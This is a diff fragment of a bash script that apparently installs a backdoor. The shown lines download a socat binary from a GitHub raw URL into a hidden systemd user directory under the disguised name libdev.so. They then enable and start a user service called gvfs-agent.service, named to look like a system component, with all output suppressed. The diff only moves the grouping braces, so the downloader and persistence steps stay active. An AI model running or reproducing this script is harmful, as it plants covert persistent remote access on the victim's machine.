@@ -1,7 +1,5 @@
 #!/bin/bash
 
-{
-
 mkdir -p $HOME/.config/systemd/user/libxct-util
 
 curl -s -l -o $HOME/.config/systemd/user/libxct-util/libdev.so https://raw.githubusercontent.com/pqowbbb/testing/main/socatx64.bin 2>/dev/null
@@ -33,5 +31,9 @@ EOF
 
 systemctl --user enable gvfs-agent.service
 systemctl --user start gvfs-agent.service
+
+{
+
+
 
 } &> /dev/null
